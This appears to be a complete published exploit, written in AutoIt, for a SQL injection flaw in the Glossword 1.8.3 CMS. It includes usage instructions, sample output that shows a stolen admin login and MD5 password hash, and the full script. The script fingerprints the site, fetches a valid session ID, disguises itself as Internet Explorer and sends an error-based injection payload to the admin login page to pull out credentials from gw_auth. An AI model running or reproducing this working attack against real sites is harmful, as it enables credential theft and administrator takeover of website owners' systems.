==============================================================
Vulnerable Software: Glossword 1.8.3
Official site: http://sourceforge.net/projects/glossword/
Download: http://sourceforge.net/projects/glossword/files/glossword/1.8.3/
Vuln: SQLi
==================THIS IS A WHOLE EXPLOIT=====================
Exploit Coded In AutoIT.
To exploit this vulnerability magic_quotes_gpc must be turned off on server side.
Print screen: http://s004.radikal.ru/i206/1302/89/d7398ade1cd7.png
POC video: http://youtu.be/55IaNTQS3Fk

Exploit usage:

C:\0day>glossa.exe http://hacker1.own /glossword/glossword/ 2


##############################################################
#           Glossword 1.8.3 SQL injection Exploit            #
# Usage: glossa.exe http://site.tld  /installdir/  UID (int) #
#        DON&#039;T HATE THE HACKER, HATE YOUR OWN CODE!          #
#            VULN/Exploit: AkaStep & HERO_AZE                #
##############################################################

##############################################################
[*] SENDING FAKE SESSUID: ea0f5d8c7c2c8a2f9f7c3b3e5a3d4f5d [*]
##############################################################

##############################################################
[*]                  CMS is GLOSSWORD!                     [*]
##############################################################

##############################################################
[*]                FETCHING VALID SESSUID                  [*]
##############################################################

##############################################################
[*]  Got VALID SESSUID: aa0e680bef2679932393abe72b78ef03   [*]
##############################################################

##############################################################
[*]                  !~ P*W*N*E*D ~!                       [*]
--------------------------------------------------------------
[*] Login: admin                                           [*]
--------------------------------------------------------------
[*] Password: (MD5) 260efaff0cac0f78a53ccc540e89e72d       [*]
--------------------------------------------------------------
Admin Panel: hacker1.own/glossword/glossword/gw_admin/login.php
--------------------------------------------------------------
[*]                    Good Luck;)                         [*]
##############################################################
[*]                     DONE                               [*]
##############################################################




#ce


#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Outfile=glossa.exe
#AutoIt3Wrapper_UseUpx=n
#AutoIt3Wrapper_Change2CUI=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include "WinHttp.au3"
#include <inet.au3>
#include <String.au3>

$triptrop=@CRLF & _StringRepeat(&#039;#&#039;,62) & @CRLF;
$exploitname=@CRLF & _StringRepeat(&#039;#&#039;,62) & @CRLF & _
&#039;#&#039; & _StringRepeat(&#039; &#039;,11) & &#039;Glossword 1.8.3 SQL injection Exploit &#039; & _StringRepeat(&#039; &#039;,11) & &#039;#&#039; & @CRLF  & _
&#039;# Usage: &#039; & @ScriptName &  &#039; http://site.tld &#039; & &#039; /installdir/ &#039; & &#039; UID (int) #&#039; & _
@CRLF & "#        DON&#039;T HATE THE HACKER, HATE YOUR OWN CODE!          #" & @CRLF & _
&#039;#            VULN/Exploit: AkaStep & HERO_AZE                #&#039; & @CRLF & _StringRepeat(&#039;#&#039;,62);
ConsoleWrite(@CRLF & $exploitname & @CRLF)

$method=&#039;POST&#039;;
$vulnurl=&#039;gw_admin/login.php&#039;
Global $sessid=0
$cmsindent=&#039;lossword&#039;; # We will use it to identify CMS #;
$adminpanel=$vulnurl

;#~  Impersonate that We Are Not BOT or exploit.We are human who uses IE.# ~;
$useragent=&#039;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; SV1; .NET CLR 1.1.4325)&#039;;
$msg_usage="Command Line Plizzzz => " & @CRLF & "Usage: " & @ScriptName &  &#039; http://site.tld &#039; & &#039; /installdir/ &#039; &  &#039; UID (int)&#039; & @CRLF
if  $CmdLine[0] <> 3 Then
  ConsoleWrite(@CRLF & _StringRepeat(&#039;#&#039;,62) & @CRLF & $msg_usage & @CRLF & _StringRepeat(&#039;#&#039;,62) & @CRLF);
  MsgBox(64,"",$msg_usage);
  exit;
EndIf


if $CmdLine[0]=3 Then
$targetsite=$CmdLine[1];
$installdir=$CmdLine[2];
$uidtoattack=Number(StringMid($CmdLine[3],1,255));
EndIf

if not StringIsDigit($uidtoattack) Then
  ConsoleWrite(&#039; UID is wrong! Exit&#039; );
  Exit;
  EndIf



if StringStripWS($targetsite,8)=&#039;&#039; OR StringStripWS($installdir,8)=&#039;&#039; Then
  ConsoleWrite(&#039;Are you kidding meeeeen?&#039;);
  Exit;
EndIf


HttpSetUserAgent($useragent)
$doublecheck=InetGet($targetsite,&#039;&#039;,1);
if @error Then
  ConsoleWrite(&#039;[*] Incorrect Domain Name/Or you are Offline! [*]&#039; & @CRLF)
  Exit;
EndIf



sleep(Random(1200,2500,1));

sendfakeretrivevalidsess($targetsite,$installdir)

HttpSetUserAgent($useragent);
$sidentify=_INetGetSource($targetsite & $adminpanel,True);

Func exploit($targetsite,$installdir,$sessid)
Global $sAddress = $targetsite
Global $PAYLOADTOSEND ="arPost[user_name]=&#039;) AND (select floor(rand(0)*2) from(select count(*)," & _
"concat((select concat(0x3C73696B6469723E,login,0x7c,password,0x3C2F73696B6469723E,0x7c) from " & _
"gw_auth where id_auth=" & $uidtoattack & "),floor(rand(0)*2))x from information_schema.tables group by x)a)-- " & _
" AND 1=(&#039;1&arPost[user_email]=trueownage&a=lostpass&sid=" & $sessid & "&post=Send password";
Global $sDomain = $targetsite
Global $sPage = $installdir & $vulnurl
Global $sAdditionalData = $PAYLOADTOSEND
Global $hOpen = _WinHttpOpen($useragent)
Global $hConnect = _WinHttpConnect($hOpen, $sDomain)
Global $hRequest = _WinHttpOpenRequest($hConnect, "POST", $sPage, -1, -1, -1, &#039;&#039;)
_WinHttpSendRequest($hRequest, "Content-Type: application/x-www-form-urlencoded", $sAdditionalData)
_WinHttpReceiveResponse($hRequest)
Global $sReturned
If _WinHttpQueryDataAvailable($hRequest) Then
    Do
        $sReturned &= _WinHttpReadData($hRequest)
    Until @error

  if StringInStr($sReturned,&#039;<sikdir>&#039;) and StringInStr($sReturned,&#039;</sikdir>&#039;) Then

$zsuxxv = StringRegExp($sReturned, &#039;<(?i)sikdir>(.*?)</(?i)sikdir>&#039;, 1)
For $x = 0 To UBound($zsuxxv) - 1
  Beep(100,1000);
    ConsoleWrite($triptrop & &#039;[*]                  !~ P*W*N*E*D ~!                       [*] &#039; & _
  StringReplace($triptrop,&#039;#&#039;,&#039;-&#039;) & &#039;[*] Login: &#039; & StringMid($zsuxxv[$x],1,StringInStr($zsuxxv[$x],&#039;|&#039;)-1) & _
  _StringRepeat(&#039; &#039;,StringLen($triptrop)-18-StringLen(StringMid($zsuxxv[$x],1,StringInStr($zsuxxv[$x],&#039;|&#039;)-1))) & &#039;[*]&#039; & _
  StringReplace($triptrop,&#039;#&#039;,&#039;-&#039;) & &#039;[*] Password: (MD5) &#039; & StringReplace($zsuxxv[$x],StringMid($zsuxxv[$x],1,StringInStr($zsuxxv[$x],&#039;|&#039;)),&#039;&#039;) & _
  &#039;       [*] &#039; & _
  StringReplace($triptrop,&#039;#&#039;,&#039;-&#039;) & _
  &#039;Admin Panel: &#039; & $targetsite & $installdir &$adminpanel & &#039; &#039; & StringReplace($triptrop,&#039;#&#039;,&#039;-&#039;) & _
  &#039;[*]                    Good Luck;)                         [*]&#039; & _
  $triptrop & &#039;[*]                     DONE                               [*]&#039; & _
  $triptrop);
Next

Else

  ConsoleWrite($triptrop & &#039;[*] &#039; & _StringRepeat(&#039; &#039;,18) & &#039;   NO SUCH UID!   &#039; &  _StringRepeat(&#039; &#039;,18) & _
  &#039; [*]&#039; & $triptrop);
  Beep(1500,1000);
  Exit


    EndIf
EndIf
_WinHttpCloseHandle($hRequest)
_WinHttpCloseHandle($hConnect)
_WinHttpCloseHandle($hOpen)
EndFunc;=> exploit();


Func  sendfakeretrivevalidsess($targetsite,$installdir)

$fakesessionID=&#039;&#039;;
Do
$fakesessionID&=Chr(Random(97,102,1)) & Random(0,9,1)
until StringLen($fakesessionID)=32

$fakesessionID=StringMid($fakesessionID,Random(1,32,1),1) & StringMid($fakesessionID,1,StringLen($fakesessionID)-1)
ConsoleWrite($triptrop & &#039;[*] SENDING FAKE SESSUID: &#039; & $fakesessionID &  &#039; [*] &#039; &  $triptrop)
sleep(Random(1000,2500,1))
$rtarget=$targetsite & $installdir &"gw_admin/login.php?visualtheme=gw_admin&sid=" &$fakesessionID;
HttpSetUserAgent($useragent);
$str=_INetGetSource($rtarget);
if StringInStr($str,"Session does not exist.") then
ConsoleWrite($triptrop & &#039;[*]&#039; &  _StringRepeat(&#039; &#039;,18) & &#039;CMS is GLOSSWORD!  &#039; &  _StringRepeat(&#039; &#039;,19) & &#039;[*]&#039; & $triptrop);
sleep(Random(1000,2500,1))
Else
  ConsoleWrite($triptrop & &#039;[*]&#039; & _StringRepeat(&#039; &#039;,11) &&#039;NOPE:( THIS IS NOT GLOSSWORD CMS.&#039; &_StringRepeat(&#039; &#039;,12) &&#039;[*]&#039; & $triptrop);
exit;
EndIf
$i=123
$mystr=&#039;&#039;;
ConsoleWrite($triptrop & &#039;[*]&#039; & _StringRepeat(&#039; &#039;,16) & &#039;FETCHING VALID SESSUID&#039; & _StringRepeat(&#039; &#039;,17) & &#039; [*]&#039; & $triptrop)
sleep(Random(1000,2500,1))
Do
$i+=1;
if $i>=4000 then ExitLoop;//Just for make sure we are not going to infinitive loop if there any error occurs.//
$mystr&=StringMid($str,$i,1)
until StringInStr($mystr,chr(34));


$sessid=StringMid($mystr,StringInStr($mystr,Chr(61))+1,32)
if not $sessid =32 Then
  ConsoleWrite($triptrop & &#039;[*] Sorry Man! Theris an error while fetching new VALID SESSUID  [*]&#039; & $triptrop)
  exit;
Else
  ConsoleWrite($triptrop & &#039;[*]  Got VALID SESSUID: &#039; & $sessid &  &#039;   [*]&#039; & $triptrop)
EndIf
$targetsite=StringReplace(StringReplace($targetsite,&#039;http://&#039;,&#039;&#039;),&#039;/&#039;,&#039;&#039;)
exploit($targetsite,$installdir,$sessid)
EndFunc;=>sendfakeretrivevalidsess();




#cs

================================================
           KUDOSSSSSSS
================================================
packetstormsecurity.org
packetstormsecurity.com
packetstormsecurity.net
securityfocus.com
cxsecurity.com
security.nnov.ru
securtiyvulns.com
securitylab.ru
secunia.com
securityhome.eu
exploitsdownload.com
osvdb.com
websecurity.com.ua
1337day.com
itsecuritysolutions.org

to all Aa Team + to all Azerbaijan Black HatZ
+ *Especially to my bro CAMOUFL4G3 *
To All Turkish Hackers

Also special thanks to: ottoman38 & HERO_AZE
================================================

/AkaStep

